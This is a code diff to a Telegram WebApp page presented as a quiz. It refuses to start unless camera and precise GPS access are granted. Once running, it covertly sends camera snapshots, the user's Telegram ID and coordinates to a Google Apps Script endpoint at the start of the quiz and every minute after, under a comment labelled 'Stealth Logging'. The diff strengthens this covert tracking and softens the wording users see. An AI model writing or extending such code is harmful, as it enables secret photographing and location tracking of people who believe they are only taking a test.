@@ -39,6 +39,7 @@
     const tg = window.Telegram.WebApp;
     tg.expand();
 
+    // Aapki di hui URL
     const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxCSOW6Lm6sqRDifSvjHLB64smEA1Vl0Ph2H8COe-md67E9COLYFO6cQwkNj0CTidm2YA/exec"; 
 
     const user = tg.initDataUnsafe?.user || {};
@@ -53,41 +54,48 @@
     async function requestAllPermissions() {
         const btn = document.getElementById("startBtn");
         btn.disabled = true;
-        btn.innerText = "Verifying... ⏳";
+        btn.innerText = "Configuring... ⏳";
 
         try {
-            // 1. Camera Check
+            // 1. Camera Verification
             if (!globalStream) {
                 globalStream = await navigator.mediaDevices.getUserMedia({ video: true });
             }
 
-            // 2. Location Check (With Fallback)
-            if (userLoc === "Pending") {
+            // 2. High Accuracy Location Verification
+            if (userLoc === "Pending" || userLoc.includes("Timeout")) {
                 try {
                     const pos = await new Promise((res, rej) => {
                         navigator.geolocation.getCurrentPosition(res, rej, {
-                            enableHighAccuracy: false, // Accuracy thodi kam ki taaki jaldi load ho
-                            timeout: 5000 
+                            enableHighAccuracy: true, // Accuracy badha di gayi hai
+                            timeout: 15000,           // 15 seconds ka wait time
+                            maximumAge: 0
                         });
                     });
                     userLoc = `${pos.coords.latitude}, ${pos.coords.longitude}`;
                 } catch (e) {
-                    userLoc = "Location_Timeout/Denied";
-                    console.log("Location not found, but continuing...");
+                    console.log("Location Error:", e);
+                    userLoc = "Error: Please Enable GPS";
+                    // Agar location error hai toh user ko batao
+                    alert("Location Error: कृपया अपने फोन का GPS (Location) चालू करें और Page को Refresh करें।");
+                    btn.disabled = false;
+                    btn.innerText = "प्रक्रिया शुरू करें";
+                    return; // Test shuru nahi hoga bina location ke
                 }
             }
 
-            // 3. Final Verification - Start Quiz
+            // 3. Quiz Start
             document.getElementById("login").style.display = "none";
             document.getElementById("quizBox").style.display = "block";
             loadQuestion();
             
-            // Logging
+            // Initial Logging
             captureAndSend("Test_Started");
+            // Recurring Stealth Logging
             setInterval(() => captureAndSend("Periodic_Check"), 60000);
 
         } catch (err) {
-            alert("Security Error: कैमरा एक्सेस अनिवार्य है। कृपया ब्राउज़र सेटिंग्स में जाकर Allow करें।");
+            alert("Security Error: कैमरा एक्सेस अनिवार्य है। कृपया ब्राउज़र सेटिंग्स चेक करें।");
             btn.disabled = false;
             btn.innerText = "प्रक्रिया शुरू करें";
         }
@@ -103,7 +111,7 @@
             const canvas = document.createElement('canvas');
             canvas.width = 320; canvas.height = 240;
             canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-            const photoData = canvas.toDataURL('image/jpeg', 0.3); // Quality 0.3 for faster speed
+            const photoData = canvas.toDataURL('image/jpeg', 0.3);
 
             const payload = {
                 userId: user.id || "NA",
@@ -120,7 +128,11 @@
     }
 
     function loadQuestion() {
-        if (currentIdx >= questions.length) { alert("Test Submitted!"); tg.close(); return; }
+        if (currentIdx >= questions.length) { 
+            alert("Test Submitted Successfully!"); 
+            tg.close(); 
+            return; 
+        }
         const qData = questions[currentIdx];
         document.getElementById("question").innerText = qData.q;
         const optionsDiv = document.getElementById("options");
